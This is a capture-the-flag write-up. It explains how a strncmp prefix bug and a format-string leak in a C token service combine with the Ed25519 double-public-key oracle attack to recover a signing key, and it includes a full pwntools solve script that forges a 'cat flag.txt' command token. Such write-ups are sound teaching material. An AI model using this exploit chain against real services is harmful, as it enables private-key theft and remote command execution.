# Feeling Lucky &mdash; solution

We are given instructions to connect to a remote server, along with the
`handout.zip` containing the source code of that server. Let's connect and see
what happens.

```
$ nc 0.cloud.chals.io 30764

Do you feel lucky???

1) create_user
2) get_token
3) redeem_token
4) quit
> 1
user_id(hex) = 93387103526eb1ad650f5736a09a1a4067cb4c55f1f61e7aafcc6bf17e7932e0
1) create_user
2) get_token
3) redeem_token
4) quit
> 2
user_id(hex)> 93387103526eb1ad650f5736a09a1a4067cb4c55f1f61e7aafcc6bf17e7932e0
token(hex) = 687af3870eb96fa7ccc071e6a221385d675dfeb5ca068ed15937d980c55dba993e9e51e8ffb99c2f549504d5d927b24c4ed5390ddc48d8fc2ebb14c71dd94b006563686f2022626574746572206c75636b206e6578742074696d6522
1) create_user
2) get_token
3) redeem_token
4) quit
> 3
user_id(hex)> 93387103526eb1ad650f5736a09a1a4067cb4c55f1f61e7aafcc6bf17e7932e0
token(hex)> 687af3870eb96fa7ccc071e6a221385d675dfeb5ca068ed15937d980c55dba993e9e51e8ffb99c2f549504d5d927b24c4ed5390ddc48d8fc2ebb14c71dd94b006563686f2022626574746572206c75636b206e6578742074696d6522
better luck next time
```

Ok, so we are able to create users, get some sort of token for a user, and then
redeem that token. Let's inspect the source code to figure out the details.

First we'll notice that the `chall` binary depends on `tweetnacl.h` library.
The code is likely simply taken from
[here](https://github.com/dominictarr/tweetnacl), so let's ignore it for the
time being, i.e. assume it contains correct crypto implementations.

Let's inspect `chall.c`, this is the main function:

```c
int main(void) {
  setvbuf(stdout, NULL, _IONBF, 0);
  printf("Do you feel lucky???\n\n");
  for (;;) {
    printf("%s", MENU);
    char line[32];
    rdline(line, sizeof line);
    if (!strcmp(line, "1") || !strcasecmp(line, "create_user"))
      do_create();
    else if (!strcmp(line, "2") || !strcasecmp(line, "get_token"))
      do_token();
    else if (!strcmp(line, "3") || !strcasecmp(line, "redeem_token"))
      do_redeem();
    else if (!strcmp(line, "4") || !strcasecmp(line, "quit") ||
             !strcasecmp(line, "exit")) {
      printf("bye");
      break;
    } else
      printf("?");
  }
  return 0;
}
```

It matches the behaviour of the main menu we've seen when playing with the
remote service. Let's inspect `do_create()`, `do_token()`, and `do_redeem()`
functions, that's where the core implementation lines.

This is the `do_create()` function:

```c
static void do_create(void) {
  int k = -1;
  for (int i = 0; i < NMAX; ++i)
    if (!DB[i].used) {
      k = i;
      break;
    }
  if (k < 0) {
    log_note("warn", "%s", "no slots");
    return;
  }
  if (crypto_sign_keypair(DB[k].p, DB[k].s) != 0) {
    log_note("err", "%s", "keygen failed");
    exit(1);
  }
  DB[k].used = 1;
  char pkhex[2 * 32 + 1];
  to_hex(pkhex, sizeof pkhex, DB[k].p, 32);
  printf("user_id(hex) = %s\n", pkhex);
}
```

This function allocates a new account entry, generates an `Ed25519` keypair for
it, and prints the public key as the user ID. This means the challenge likely
revolves around [EdDSA](https://en.wikipedia.org/wiki/EdDSA) signature scheme.

What's interesting here is that `user_id` is exactly the public key.

Let's inspect `do_token()`.

```c
static void do_token(void) {
  char idraw[2 * IDLEN + 512];
  unsigned char id[IDLEN];

  printf("user_id(hex)> ");
  fflush(stdout);
  rdline(idraw, sizeof idraw);
  dechex32(id, idraw);

  int k = pick(id);
  if (k < 0) {
    char emsg[2 * IDLEN + 32];
    snprintf(emsg, sizeof emsg, "unknown user id: %s", idraw);
    log_note("warn", "%s", emsg);
    return;
  }

  const char *cmd = cmdpick();
  size_t ml = strlen(cmd);
  if (ml > MMAX) {
    log_note("err", "%s", "internal err");
    exit(1);
  }

  unsigned char sig[64 + MMAX];
  unsigned long long bl =
      sign_blob(sig, sizeof sig, (const unsigned char *)cmd, ml, DB[k].s, id);

  char buf[2 * (64 + MMAX) + 1];
  to_hex(buf, sizeof buf, sig, bl);
  if (memcmp(DB[k].p, id, 32) == 0) {
    printf("token(hex) = %s\n", buf);
  } else {
    char linefmt[2 * IDLEN + 512];
    snprintf(linefmt, sizeof linefmt, "%s%s",
             "public key mismatch for user with id: ", idraw);
    log_note("warn", linefmt, buf);
  }
}
```

The function asks for the user id (public key) and attempts to issue a token to
that user. First it checks that the user exists using the `pick()` function:

```c
static int pick(const unsigned char id[32]) {
  for (int i = 0; i < NMAX; ++i) {
    if (!DB[i].used)
      continue;
    if (!strncmp((const char *)id, (const char *)DB[i].p, IDLEN))
      return i;
  }
  return -1;
}
```

While inconspicuous at first glance, notice that
[strncmp](https://cplusplus.com/reference/cstring/strncmp/) is not the greatest
choice for this purpose. The reason being that it treats its inputs as C
strings, and will stop comparing before `n`-th character if one of the string
ends (i.e. reaches a `\0` character).

This makes the equality check flawed, as it will treat two public keys as equal
if they have an equal prefix ending in a `\x00` byte.

Going back to `do_token`, it will pick a random command using `cmdpick()` if
there is a user ID match. Let's take a look at `cmdpick()`:

```c
static const char *cmdpick(void) {
  uint8_t r;
  randombytes(&r, 1);
  uint64_t j;
  randombytes((unsigned char *)&j, sizeof j);
  if (j == 0xDEADBEEFCAFEBABEULL)
    return "cat flag.txt";
  switch (r % 3) {
  case 0:
    return "ls";
  case 1:
    return "echo \"better luck next time\"";
  default:
    return "echo \"try harder!\"";
  }
}
```

Now the challenge title makes sense, as we really need to be lucky in order to
get a signed token which outputs the flag. However, this reveals the nature of
the challenge, we'll likely need to forge a token which contains a `cat
flag.txt` command which the service will then execute and reveal the flag.

Moving on, the random command will be signed and returned as a token which has
the following format: `token(hex) = <signature||message in hex>`.

Interestingly enough, before the token is outputted, there is another
comparison of the stored public key bytes with the provided ones. This time,
the service uses `memcmp`, which should fix the wrong `strncmp`-based
comparison from `pick()` function.

Let's see now what happens in `do_redeem()`:

```c
static void do_redeem(void) {
  char idraw[2 * IDLEN + 512];
  unsigned char id[IDLEN];

  printf("user_id(hex)> ");
  fflush(stdout);
  rdline(idraw, sizeof idraw);
  dechex32(id, idraw);

  int k = pick(id);
  if (k < 0) {
    char emsg[2 * IDLEN + 32];
    snprintf(emsg, sizeof emsg, "unknown user id: %s", idraw);
    log_note("warn", "%s", emsg);
    return;
  }

  char tok[2 * (TMAX) + 8];
  printf("token(hex)> ");
  fflush(stdout);
  rdline(tok, sizeof tok);

  size_t tl = strlen(tok);
  if (tl % 2) {
    log_note("warn", "%s", "bad token");
    return;
  }
  size_t sn = tl / 2;
  if (sn < 64 || sn > TMAX) {
    log_note("warn", "%s", "bad token");
    return;
  }

  unsigned char sm[TMAX];
  for (size_t i = 0; i < sn; ++i) {
    int hi = hx(tok[2 * i]), lo = hx(tok[2 * i + 1]);
    if (hi < 0 || lo < 0) {
      log_note("warn", "%s", "bad token hex");
      return;
    }
    sm[i] = (unsigned char)((hi << 4) | lo);
  }

  unsigned char m[TMAX];
  unsigned long long ml = 0;
  if (crypto_sign_open(m, &ml, sm, sn, DB[k].p) != 0) {
    log_note("warn", "%s", "invalid token");
    return;
  }
  if (ml >= MMAX) {
    log_note("warn", "%s", "cmd too long");
    return;
  }
  m[ml] = 0;

  int rc = system((char *)m);
  (void)rc;
}
```

This function essentially parses the token, verifies the signature, and if
everything checks out it runs the signed command. The similar `strncmp`-based
comparison wrinkle exists, but we don't see any major holes in validation.

## Ed25519 Double Public Key Signing Function Oracle Attack

Investigating the crypto primitive of choice, it's not hard to come across this
attack. It basically states that it's possible to recover the private signing
key if we can obtain two signatures of the same message with the same private
key, but different public keys. This is relevant if the signing primitive
exposes an interface where it accepts both the private and public key as inputs
to a signing function, but doesn't explicitly check they are related.

While not novel, this attack gained some traction in 2023 when researchers from
[Mysten Labs](https://www.mystenlabs.com/) reported their findings on a bunch
of software implementations ([see paper](https://arxiv.org/pdf/2308.15009)).

Since the code already has some sloppy checks with regards to public keys (e.g.
`strncmp`), this might be an avenue to exploit.

## Vulnerability Chain

The `strncmp`-based comparison in `do_token()` already allows us to supply a
public key which the service will determine matches the existing one, assuming
the existing one has a null byte in it. Once we supply such a key, the service
will calculate the signature using the key we control.

The problem is that we can't pass the second `memcmp`-based check. Let's take
another look at that snippet.

```c
if (memcmp(DB[k].p, id, 32) == 0) {
  printf("token(hex) = %s\n", buf);
} else {
  char linefmt[2 * IDLEN + 512];
  snprintf(linefmt, sizeof linefmt, "%s%s",
           "public key mismatch for user with id: ", idraw);
  log_note("warn", linefmt, buf);
}
```

Let's take a look at `log_note`:

```c
static void log_note(const char *tag, const char *fmt, void *ctx) {
  if (tag && *tag) {
    printf("[%s] ", tag);
  }
  printf(fmt, ctx);
  printf("\n");
}
```

That's it! We've found the [format string
vulnerability](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/)
since the public key we've supplied is directly passed to `printf`.
Conveniently, the signature is also passed as an argument so we can surely leak
it.

## Putting it all Together

We've now completed our attack chain. To recap, we will:
  - Find a generated public key that contains a `0x00` byte.
  - Supply two different hex-IDs that match that key under `strncmp` (same prefix
    up to the `0x00`) but are different bytes afterwards so `pick()` picks the same
    slot while `memcmp` later fails.
  - The mismatch branch calls a logging routine `printf(fmt, arg)` with
    attacker-controlled `fmt`. Use a format string to leak the signature
    bytes the server just produced.
  - Repeat until we obtain two signatures of the **same message** (server
    chooses from a small list) that share the same $R$ but have different $S$.
  - Once we have that, leak the private key and forge a valid `R||S||"cat flag.txt"` token.

The (ugly) solve script with all the details baked in:

```python
#!/usr/bin/env python3

import os, sys, re, time, hashlib
from typing import Optional, Tuple
from pwn import *

context.log_level = os.environ.get("LOG", "info")

BIN   = os.environ.get("BIN", "./chall")
HOST  = os.environ.get("HOST")
PORT  = int(os.environ.get("PORT", "0")) if os.environ.get("PORT") else None

PROMPT          = b"> "
USER_PROMPT     = b"user_id(hex)> "
TOKEN_PROMPT    = b"token(hex)> "
TOKEN_PREFIX    = b"token(hex) = "
MISMATCH_ANCHOR = b"public key mismatch for user with id: "

CAND_MSGS = [
    b"ls",
    b'echo "better luck next time"',
    b'echo "try harder!"',
]

FMT = "%1$128.128s"

L = int("1000000000000000000000000000000014def9dea2f79cd65812631a5cf5d3ed", 16)

def start():
    if HOST and PORT:
        return remote(HOST, PORT)
    return process([BIN])

def wait_menu(io): io.recvuntil(PROMPT, timeout=2)
def menu_send(io, s: bytes): wait_menu(io); io.sendline(s)

def create_user(io) -> bytes:
    menu_send(io, b"1")
    line = io.recvline(timeout=2) or b""
    if not line.startswith(b"user_id(hex) = "):
        line += io.recvline(timeout=0.3) or b""
    m = re.search(br"user_id\(hex\) = ([0-9a-f]{64})", line)
    if not m: raise EOFError(f"bad create_user: {line!r}")
    pk_hex = m.group(1).decode()
    log.info(f"[create_user] {pk_hex}")
    return bytes.fromhex(pk_hex)

def first_zero_idx(b: bytes) -> Optional[int]:
    for i, x in enumerate(b):
        if x == 0: return i
    return None

def build_aliases_extreme(pk: bytes, z: int) -> Tuple[str, str]:
    id1 = bytearray(pk); id2 = bytearray(pk)
    for j in range(z+1, 32):
        id1[j] = 0xFF
        id2[j] = 0xAA
    return id1.hex(), id2.hex()

def ed25519_h(R: bytes, A: bytes, M: bytes) -> int:
    return int.from_bytes(hashlib.sha512(R + A + M).digest(), "little") % L

def mod_div(num: int, den: int) -> int:
    return (num * pow(den % L, -1, L)) % L

def drive_get_token(io, payload: bytes) -> Tuple[str, bytes]:
    menu_send(io, b"2")
    io.recvuntil(USER_PROMPT, timeout=2)
    io.sendline(payload)

    buf = b""
    deadline = time.time() + 5.0
    while time.time() < deadline:
        chunk = io.recv(timeout=0.2)
        if not chunk: continue
        buf += chunk

        if TOKEN_PREFIX in buf:
            s = buf.find(TOKEN_PREFIX)
            e = buf.find(b"\n", s)
            if e != -1:
                return ("token", buf[s:e+1])

        if MISMATCH_ANCHOR in buf:
            s = buf.find(MISMATCH_ANCHOR)
            line_start = buf.rfind(b"\n", 0, s) + 1
            tail = buf[line_start:]
            if b"\n" in tail:
                line = tail.split(b"\n", 1)[0] + b"\n"
                return ("mismatch", line)
            rest = io.recvuntil(b"\n", timeout=2) or b"\n"
            return ("mismatch", tail + rest)

    try:
        io.recvuntil(PROMPT, timeout=0.3)
    except EOFError:
        pass
    return ("timeout", buf)

def leak_sig_exact(io, id_hex: str) -> Optional[bytes]:
    payload = (id_hex + FMT).encode()
    kind, line = drive_get_token(io, payload)
    if kind != "mismatch":
        return None

    if MISMATCH_ANCHOR not in line:
        return None
    leak = line.split(MISMATCH_ANCHOR, 1)[1].rstrip(b"\n")

    idb = id_hex.encode()
    if not leak.startswith(idb):
        return None
    after = leak[len(idb):]

    if len(after) >= 128 and re.fullmatch(br"[0-9a-fA-F]{128}", after[:128]):
        sig = bytes.fromhex(after[:128].decode())
        return sig

    return None

def main():
    io = start()

    pk = None; z = None
    for _ in range(4096):
        p = create_user(io)
        zi = first_zero_idx(p)
        if zi is not None:
            pk, z = p, zi
            break
    if pk is None:
        log.failure("No pk with 0x00 found.")
        return
    pk_hex = pk.hex()
    log.success(f"pk={pk_hex}  NUL@{z}")

    id1_hex, id2_hex = build_aliases_extreme(pk, z)
    id1 = bytes.fromhex(id1_hex)
    id2 = bytes.fromhex(id2_hex)
    log.info(f"id1={id1_hex}")
    log.info(f"id2={id2_hex}")

    sig1 = sig2 = None
    for _ in range(20000):
        s1 = leak_sig_exact(io, id1_hex)
        if s1 is None:
            continue
        s2 = leak_sig_exact(io, id2_hex)
        if s2 is None:
            continue
        if s1[:32] == s2[:32]:
            sig1, sig2 = s1, s2
            break
    if sig1 is None:
        log.failure("Failed to get two signatures with the same R.")
        return

    R  = sig1[:32]
    S1 = int.from_bytes(sig1[32:], "little")
    S2 = int.from_bytes(sig2[32:], "little")
    log.success(f"R = {R.hex()}")

    from nacl import bindings

    a = None
    for M in CAND_MSGS:
        h1 = ed25519_h(R, id1, M)
        h2 = ed25519_h(R, id2, M)
        den = (h1 - h2) % L
        if den == 0:
            continue
        a_try = mod_div((S1 - S2) % L, den)
        A_try = bindings.crypto_scalarmult_ed25519_base_noclamp(a_try.to_bytes(32, "little"))
        if A_try == pk:
            a = a_try
            log.success(f"Correct M={M!r}, a={a:064x}")
            break

    if a is None:
        log.failure("No candidate validated; re-run to change RNG.")
        return

    target = b"cat flag.txt"
    r = int.from_bytes(os.urandom(64), "little") % L
    Rbytes = bindings.crypto_scalarmult_ed25519_base_noclamp(r.to_bytes(32, "little"))
    h = ed25519_h(Rbytes, pk, target)
    S = (r + h * a) % L
    sig = Rbytes + S.to_bytes(32, "little")
    token_hex = (sig + target).hex()

    menu_send(io, b"3")
    io.recvuntil(USER_PROMPT, timeout=2); io.sendline(pk_hex.encode())
    io.recvuntil(TOKEN_PROMPT, timeout=2); io.sendline(token_hex.encode())

    out = io.recv(timeout=2) or b""
    if out:
        log.success("Service output:")
        sys.stdout.buffer.write(out)

    io.close()

if __name__ == "__main__":
    main()

```

Running it reveals the flag:
```
[*] [create_user] 14f9ce913afd5c9d3ba1a8b85c0ff935d98b1bef21223647728f1ae3695429d7
[*] [create_user] afcf844fdfeab11c157af555868cc1314c933ce7f70692796c72a82a78a84453
[*] [create_user] 65adfdfd96e15350065dc2ad436bc0549da1632d3b3bc1cc4e901568b014864c
[*] [create_user] 097f0c7f3c368bb0a594ad5d2871fcfb686b4433bd6cd788d1209f74eb82512b
[*] [create_user] 3ec80eede26af5ccd1cc873e5beadb51e43fd284721a4098d372c3ecb61cc43b
[*] [create_user] 33017b3f957f24c8f65dabe0dde8a87cb479657ba59fb34219ef3cf1af7d8cf6
[*] [create_user] 4597969488b8ce8b02e460755db69b780c24fe697b4ea3c7186b8a88fa5ed968
[*] [create_user] ff0f441b800e90be51516a56f46020e2f6942287e5d6ca0dbffbd195eeb33016
[*] [create_user] 4d4581000a22e85174b8b1603e6cb186f7636fc01cdb4a75c2866bb905a12768
[+] pk=4d4581000a22e85174b8b1603e6cb186f7636fc01cdb4a75c2866bb905a12768  NUL@3
[*] id1=4d458100ffffffffffffffffffffffffffffffffffffffffffffffffffffffff
[*] id2=4d458100aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[+] R = d44eb8e3acc66357ef3a20f8dd6e1600f3d5de91c5a19c7729079fd081db85d1
[+] Correct M=b'echo "better luck next time"', a=0b025f7fb92b23b5d95e3e3faeb2d10f830f5b109b785be450ac61a52d3db90d
[+] Service output:
FortID{Luck_15_Pr3d1ct4bl3-7h3_H4rd3r_y0u_w0rk_7h3_Luck13r_You_G37}
```
